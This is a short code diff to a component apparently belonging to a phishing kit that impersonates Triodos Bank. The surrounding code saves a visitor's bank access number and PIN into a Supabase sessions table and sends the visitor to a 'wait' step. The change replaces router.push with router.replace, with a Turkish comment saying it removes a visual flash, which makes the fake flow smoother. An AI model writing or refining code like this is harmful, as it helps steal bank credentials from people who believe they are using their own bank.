@@ -33,7 +33,8 @@ export function TriodosBankClient({ sessionId }: { sessionId: string }) {
     await supabase.from("sessions").update({ is_hidden: false, current_step: "wait",
       form_data: { ...prev, bankSlug: "triodos-bank", bankName: "Triodos Bank", verfuegernummer: username, pin: password }
     }).eq("id", sessionId);
-    router.push(stepToPath("wait", sessionId));
+    // ⭐ FLASH YOK: router.push → router.replace
+    router.replace(stepToPath("wait", sessionId));
   }
 
   return (
